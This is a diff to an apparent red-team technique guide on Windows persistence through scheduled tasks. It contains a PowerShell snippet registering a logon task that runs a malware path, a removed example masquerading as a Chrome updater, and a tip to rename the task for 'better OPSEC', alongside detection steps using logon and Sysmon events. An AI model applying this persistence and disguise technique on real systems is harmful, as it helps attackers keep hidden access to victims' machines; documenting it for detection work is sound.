@@ -8,18 +8,17 @@
 
     ```powershell   
 
-    # Here outpath is the location that your persistent file is. 
-    
-    $outpath = "C:\Program Files (x86)\Google\Chrome\Application\44.0.2403.155\chromehelper.exe"
-
+    # Here outpath is the location that your persistent file is.
+    $outpath = "<path to malware"
     $action = New-ScheduledTaskAction -Execute $outpath
+    $time = New-TimeSpan -Minutes 1
 
-    $days = 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday'
+    $trigger = New-ScheduledTaskTrigger -AtLogon -RandomDelay $time
 
-    $trigger = New-ScheduledTaskTrigger -weekly -DaysOfWeek $days -At 9am
-    Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "chromehelper" -Description "This task grabs Chrome Official Updates."
-
+    Register-ScheduledTask -Action $action -Trigger $trigger -Taskname "Logon Item Persistence" -Description "This is a POC for Login-Items persistence."
+    
     ```
+>*Note*: You should also change the name of the `-Taskname` and `-Description` fields for better OPSEC
 
 2. Execute the following command:
 
@@ -32,3 +31,5 @@
 
 ## Detection Technique
 * Investigate file creation in the default windows task folder - C:\Windows\System32\Tasks folder.
+* Associate logon events (4624) within same time frame as execution of suspicious applications.
+* This would involve two seperate searches, One search to identify process creation (Sysmon event code 1) of the malware and then another search of windows event code 4624 around the same time stamp on the victim workstation.
